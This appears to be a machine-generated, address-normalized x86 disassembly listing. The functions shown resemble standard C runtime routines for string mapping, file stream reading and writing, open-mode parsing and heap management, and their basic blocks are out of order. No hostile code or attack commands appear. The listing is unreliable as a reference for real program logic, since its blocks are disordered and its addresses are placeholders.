jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_40e37b
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
push edi
push edi
push ebx
push r--data
push esi
push edi
call [ LCMapStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] edi
jne r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x24 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebx + ebx ]
add eax 0x3
and al 0xfc
call sub_40c910
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x24 ] edi
je r-xdata
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi edi
je r-xdata
test [ ebp + 0xd ] 0x4
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_40c910
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
cmp ebx edi
je r-xdata
mov eax esi
jmp r-xdata
cmp esi [ ebp + 0x1c ]
jg r-xdata
push esi
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] edi
push edi
push edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push edi
jmp r-xdata
push esi
push ebx
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je r-xdata
sub_40e37b
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test edx edx
push esi
lea ecx [ edx - 0x1 ]
je r-xdata
cmp [ eax ] 0x0
pop esi
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax edx
retn
sub eax [ esp + 0x4 ]
retn
inc eax
mov esi ecx
dec ecx
test esi esi
jne r-xdata
sub_40e3a6
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
ja r-xdata
mov ecx eax
push esi
mov esi [ rw-data ]
sar ecx 0x8
movzx edx cl
test [ esi + edx * 2 + 0x1 ] 0x80
pop esi
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
push 0x1
and [ ebp - 0x2 ] 0x0
mov [ ebp - 0x4 ] cl
mov [ ebp - 0x3 ] al
push 0x2
jmp r-xdata
and eax [ ebp + 0xc ]
leave
retn
movzx eax [ ebp + 0xa ]
leave
retn
pop eax
lea ecx [ ebp + 0xa ]
push 0x1
push 0x0
push 0x0
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_410e55
add esp 0x1c
test eax eax
jne r-xdata
sub_40e41b
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
cmp edi [ rw-data ]
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov eax edi
mov esi edi
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rw-data ]
shl esi 0x3
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
push edi
call sub_411124
cmp eax 0xffffffff
pop ecx
je r-xdata
xor ebp ebp
cmp edi 0x1
je r-xdata
xor eax eax
jmp r-xdata
push ebp
call sub_40ec6a
pop ecx
jmp r-xdata
push 0x2
call sub_411124
push 0x1
mov ebp eax
call sub_411124
pop ecx
cmp eax ebp
pop ecx
je r-xdata
cmp edi 0x2
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
or eax 0xffffffff
push edi
call sub_411124
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov ebp eax
jmp r-xdata
push edi
call sub_4110aa
mov eax [ ebx ]
pop ecx
and [ eax + esi + 0x4 ] 0x0
test ebp ebp
je r-xdata
sub_40e4ce
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_40c7f4
and [ esi + 0xc ] 0xfbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_40e4f9
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_40e534
test eax eax
pop ecx
je r-xdata
push esi
call sub_40e599
pop ecx
pop esi
retn
test [ esi + 0xd ] 0x40
je r-xdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push [ esi + 0x10 ]
call sub_411161
neg eax
pop ecx
pop esi
sbb eax eax
retn
sub_40e534
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
push edi
mov eax [ esi + 0xc ]
mov ecx eax
and ecx 0x3
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
test ax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
push edi
push eax
push [ esi + 0x10 ]
call sub_40eabd
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al 0x80
je r-xdata
and al 0xfd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_40e599
push ebx
push esi
push edi
xor esi esi
xor ebx ebx
xor edi edi
cmp [ rw-data ] esi
jle r-xdata
cmp [ esp + 0x10 ] 0x1
mov eax ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
inc esi
cmp esi [ rw-data ]
jl r-xdata
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
cmp [ esp + 0x10 ] 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push eax
call sub_40e4f9
cmp eax 0xffffffff
pop ecx
je r-xdata
test cl 0x2
je r-xdata
inc ebx
jmp r-xdata
push eax
call sub_40e4f9
cmp eax 0xffffffff
pop ecx
jne r-xdata
or edi eax
sub_40e606
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
or eax 0xffffffff
pop esi
retn
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or al 0x1
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
or al 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_410b56
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push [ esi + 0x10 ]
call sub_40e6df
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
test dl 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
mov ecx [ esi + 0x10 ]
push edi
cmp ecx 0xffffffff
je r-xdata
mov ecx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
pop esi
retn
mov ecx [ esi + 0xc ]
test cl 0x8
je r-xdata
mov edi rw-data
mov edi ecx
sar edi 0x5
and ecx 0x1f
mov edi [ edi * 4 + rw-data ]
lea edi [ edi + ecx * 8 ]
jmp r-xdata
test ch 0x4
jne r-xdata
or dh 0x20
mov [ esi + 0xc ] edx
mov cl [ edi + 0x4 ]
pop edi
and cl 0x82
cmp cl 0x82
jne r-xdata
mov [ esi + 0x18 ] 0x1000
sub_40e6df
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp esi [ rw-data ]
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov eax esi
and esi 0x1f
sar eax 0x5
shl esi 0x3
lea ebx [ eax * 4 + rw-data ]
mov eax [ eax * 4 + rw-data ]
add eax esi
mov dl [ eax + 0x4 ]
test dl 0x1
je r-xdata
and [ ebp - 0x8 ] 0x0
mov edi [ ebp + 0xc ]
cmp [ ebp + 0x10 ] 0x0
mov ecx edi
je r-xdata
xor eax eax
jmp r-xdata
test dl 0x2
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test dl 0x48
je r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov eax [ ebx ]
push [ ebp + 0x10 ]
push ecx
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov al [ eax + 0x5 ]
cmp al 0xa
je r-xdata
mov eax [ ebx ]
mov edx [ ebp - 0xc ]
add [ ebp - 0x8 ] edx
lea ecx [ eax + esi + 0x4 ]
mov al [ eax + esi + 0x4 ]
test al 0x80
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop ecx
cmp eax ecx
jne r-xdata
dec [ ebp + 0x10 ]
mov [ edi ] al
mov eax [ ebx ]
lea ecx [ edi + 0x1 ]
mov [ ebp - 0x8 ] 0x1
mov [ eax + esi + 0x5 ] 0xa
mov eax [ ebp - 0x8 ]
jmp r-xdata
test edx edx
je r-xdata
cmp eax 0x6d
jne r-xdata
mov [ rw-data ] 0x9
mov [ rw-data ] ecx
jmp r-xdata
and al 0xfb
cmp [ edi ] 0xa
jne r-xdata
push eax
call sub_40ec6a
pop ecx
jmp r-xdata
or eax 0xffffffff
sub edi [ ebp + 0xc ]
mov [ ebp - 0x8 ] edi
mov eax [ ebp + 0x10 ]
mov al [ eax ]
cmp al 0x1a
je r-xdata
or al 0x4
jmp r-xdata
mov eax [ ebx ]
lea esi [ eax + esi + 0x4 ]
mov al [ esi ]
test al 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov [ ecx ] al
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
add ecx eax
cmp eax ecx
mov [ ebp - 0x8 ] ecx
jae r-xdata
or al 0x2
mov [ esi ] al
dec ecx
cmp [ ebp + 0x10 ] ecx
jae r-xdata
mov [ edi ] al
inc edi
inc [ ebp + 0x10 ]
jmp r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
inc [ ebp + 0x10 ]
lea eax [ ebp - 0x1 ]
push 0x1
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
inc eax
cmp [ eax ] 0xa
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ebp + 0x10 ] ecx
jb r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ edi ] 0xd
inc edi
mov [ ebp + 0x10 ] eax
jmp r-xdata
add [ ebp + 0x10 ] 0x2
jmp r-xdata
jmp r-xdata
mov [ edi ] 0xd
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x48
je r-xdata
mov [ edi ] 0xa
jmp r-xdata
cmp edi [ ebp + 0xc ]
jne r-xdata
mov al [ ebp - 0x1 ]
cmp al 0xa
je r-xdata
inc edi
push 0x1
push 0xffffffff
push [ ebp + 0x8 ]
call sub_410abc
add esp 0xc
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
jne r-xdata
mov [ edi ] 0xd
mov ecx [ ebx ]
inc edi
mov [ ecx + esi + 0x5 ] al
jmp r-xdata
sub_40e8d5
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
mov al [ edi ]
cmp al 0x61
je r-xdata
mov ecx 0x109
cmp al 0x72
je r-xdata
push 0x1a4
push [ ebp + 0x10 ]
push ecx
push [ ebp + 0x8 ]
call sub_4111b8
mov ecx eax
add esp 0x10
cmp ecx ebx
jge r-xdata
cmp edx ebx
je r-xdata
xor ecx ecx
or esi 0x1
jmp r-xdata
cmp al 0x77
jne r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov [ eax + 0xc ] esi
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
movsx eax al
cmp eax 0x54
jg r-xdata
push 0x1
pop edx
mov ecx 0x301
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax 0x62
je r-xdata
je r-xdata
or esi 0x2
test ch 0xc0
je r-xdata
dec eax
je r-xdata
mov eax 0x1000
test eax ecx
jne r-xdata
sub eax 0x2b
je r-xdata
or ch 0x80
jmp r-xdata
xor edx edx
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
or ecx eax
jmp r-xdata
test cl 0x2
jne r-xdata
sub eax 0x19
je r-xdata
mov al [ edi + 0x1 ]
inc edi
cmp al bl
je r-xdata
mov [ ebp - 0x8 ] 0x1
or esi 0x4000
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
and ecx 0xfffffffe
and esi 0xfffffffc
or ecx 0x2
or esi 0x80
jmp r-xdata
test cl 0x40
jne r-xdata
sub eax 0xe
je r-xdata
mov [ ebp - 0x8 ] 0x1
and esi 0xffffbfff
jmp r-xdata
test ch 0xc0
jne r-xdata
or ecx 0x40
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
dec eax
jne r-xdata
or ch 0x40
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x20
jmp r-xdata
sub_40ea45
mov edx [ rw-data ]
push ebx
push ebp
push esi
xor ebp ebp
xor esi esi
xor eax eax
cmp edx ebp
push edi
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ebx [ rw-data ]
mov edi ebx
mov edi eax
push 0x20
shl edi 0x2
call sub_40c823
pop ecx
mov ecx [ rw-data ]
mov [ edi + ecx ] eax
mov eax [ rw-data ]
mov edi [ edi + eax ]
cmp edi ebp
je r-xdata
test [ ecx + 0xc ] 0x83
je r-xdata
mov esi edi
mov esi [ ebx + eax * 4 ]
jmp r-xdata
inc eax
add edi 0x4
cmp eax edx
jl r-xdata
or [ esi + 0x10 ] 0xffffffff
mov [ esi + 0x4 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x8 ] ebp
mov [ esi ] ebp
mov [ esi + 0x1c ] ebp
cmp esi ebp
je r-xdata
mov ecx [ edi ]
cmp ecx ebp
je r-xdata
jmp r-xdata
sub_40eabd
push ebp
mov ebp esp
sub esp 0x414
mov ecx [ ebp + 0x8 ]
push ebx
cmp ecx [ rw-data ]
push esi
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov eax ecx
mov esi ecx
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rw-data ]
shl esi 0x3
mov eax [ ebx ]
mov al [ eax + esi + 0x4 ]
test al 0x1
je r-xdata
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jne r-xdata
test al 0x20
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
add eax esi
test [ eax + 0x4 ] 0x80
je r-xdata
push 0x2
push edi
push ecx
call sub_410abc
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0xc ]
push edi
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] edi
jbe r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x40
je r-xdata
lea eax [ ebp - 0x414 ]
mov eax [ ebp - 0x8 ]
cmp eax edi
jne r-xdata
mov [ rw-data ] 0x1c
mov [ rw-data ] edi
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x1a
je r-xdata
mov edi eax
lea eax [ ebp - 0x414 ]
sub edi eax
lea eax [ ebp - 0xc ]
push 0x0
push eax
lea eax [ ebp - 0x414 ]
push edi
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov cl [ ecx ]
cmp cl 0xa
jne r-xdata
sub eax [ ebp - 0x10 ]
jmp r-xdata
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
cmp eax edi
jl r-xdata
mov [ eax ] cl
inc eax
mov ecx eax
lea edx [ ebp - 0x414 ]
sub ecx edx
cmp ecx 0x400
jl r-xdata
inc [ ebp - 0x10 ]
mov [ eax ] 0xd
inc eax
push 0x5
pop eax
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor edi edi
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp + 0x8 ]
call sub_40ec6a
pop ecx
jmp r-xdata
mov [ rw-data ] 0x9
mov [ rw-data ] eax
jmp r-xdata
sub_40ec6a
mov ecx [ esp + 0x4 ]
xor edx edx
mov [ rw-data ] ecx
mov eax rw-data
mov eax [ edx * 8 + rw-data ]
mov [ rw-data ] eax
retn
add eax 0x8
inc edx
cmp eax rw-data
jl r-xdata
cmp ecx [ eax ]
je r-xdata
cmp ecx 0x13
jb r-xdata
cmp ecx 0xbc
jb r-xdata
cmp ecx 0x24
ja r-xdata
mov [ rw-data ] 0x16
cmp ecx 0xca
mov [ rw-data ] 0x8
jbe r-xdata
mov [ rw-data ] 0xd
retn
retn
sub_40ecd1
xor eax eax
push 0x0
cmp [ esp + 0x8 ] eax
push 0x1000
sete al
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
call sub_40ed0d
test eax eax
jne r-xdata
push 0x1
pop eax
retn
push [ rw-data ]
call [ HeapDestroy@IAT ]
sub_40ed0d
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push 0x1
mov [ rw-data ] eax
mov [ rw-data ] 0x10
pop eax
retn
retn
sub_40ed4b
mov eax [ rw-data ]
lea ecx [ eax + eax * 4 ]
mov eax [ rw-data ]
lea ecx [ eax + ecx * 4 ]
xor eax eax
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
retn
add eax 0x14
jmp r-xdata
cmp eax ecx
jae r-xdata
sub_40ed76
push ebp
mov ebp esp
sub esp 0x14
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov eax [ ecx + 0x10 ]
mov esi edx
sub esi [ ecx + 0xc ]
mov ebx [ edx - 0x4 ]
add edx 0xfffffffc
push edi
shr esi 0xf
mov ecx esi
mov edi [ edx - 0x4 ]
imul ecx ecx 0x204
dec ebx
mov [ ebp - 0x4 ] edi
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ecx
mov ecx [ ebx + edx ]
test cl 0x1
mov [ ebp - 0x8 ] ecx
jne r-xdata
mov edi ebx
sar edi 0x4
dec edi
cmp edi 0x3f
jbe r-xdata
sar ecx 0x4
push 0x3f
dec ecx
pop edi
mov [ ebp + 0xc ] ecx
cmp ecx edi
jbe r-xdata
mov ecx [ ebp - 0x4 ]
and ecx 0x1
mov [ ebp - 0x14 ] ecx
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebx + edx + 0x4 ]
cmp ecx [ ebx + edx + 0x8 ]
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
sub edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
push 0x3f
mov [ ebp - 0x8 ] edx
dec ecx
pop edx
cmp ecx edx
mov [ ebp + 0xc ] ecx
jbe r-xdata
mov ecx [ ebx + edx + 0x8 ]
mov edi [ ebx + edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ ebx + edx + 0x4 ]
mov edi [ ebx + edx + 0x8 ]
add ebx [ ebp - 0x8 ]
mov [ ecx + 0x8 ] edi
mov [ ebp - 0xc ] ebx
mov ecx [ ebp + 0xc ]
cmp ecx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edi * 8 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edi * 8 ]
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
add ebx [ ebp - 0x4 ]
mov edi ebx
mov [ ebp - 0xc ] ebx
sar edi 0x4
dec edi
cmp edi edx
jbe r-xdata
mov [ ebp + 0xc ] edx
mov ecx edx
add ecx 0xffffffe0
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax + 0x4 ]
not edi
and [ eax + esi * 4 + 0xc4 ] edi
dec [ ecx ]
jne r-xdata
mov edi 0x80000000
shr edi cl
lea ecx [ ecx + eax + 0x4 ]
not edi
and [ eax + esi * 4 + 0x44 ] edi
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ edx ] ebx
mov [ ebx + edx - 0x4 ] ebx
dec [ eax ]
jne r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
cmp ecx edi
je r-xdata
mov edi edx
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] edi
mov ecx [ ebp + 0x8 ]
and [ ecx ] edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edi [ VirtualFree@IAT ]
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push 0x4000
push ebx
push ecx
call edi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov eax [ eax + 0x10 ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edi - 0x20 ]
mov edi 0x80000000
shr edi cl
lea eax [ eax + esi * 4 + 0xc4 ]
or [ eax ] edi
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edi
shr ebx cl
lea eax [ eax + esi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ edx + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
cmp ecx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
mov ebx [ ebp - 0xc ]
add ecx 0xffffffe0
mov edx 0x80000000
shr edx cl
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax + 0x4 ]
not edx
and [ eax + esi * 4 + 0xc4 ] edx
dec [ ecx ]
jne r-xdata
mov edx 0x80000000
shr edx cl
lea ecx [ ecx + eax + 0x4 ]
not edx
and [ eax + esi * 4 + 0x44 ] edx
dec [ ecx ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call edi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov eax [ rw-data ]
mov edx [ rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_410770
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
and [ ecx ] edx
jmp r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
sub eax 0x14
mov [ rw-data ] eax
mov [ rw-data ] esi
sub_40f0a1
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov edx [ rw-data ]
push ebx
push esi
lea eax [ eax + eax * 4 ]
push edi
lea edi [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
lea ecx [ eax + 0x17 ]
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
dec ecx
cmp ecx 0x20
jge r-xdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov eax [ rw-data ]
mov ebx eax
cmp ebx edi
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx edx
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ eax + 0xc4 ]
mov esi [ eax + 0x44 ]
and edx [ ebp - 0x8 ]
and esi [ ebp - 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
or edx esi
mov esi [ ebp - 0xc ]
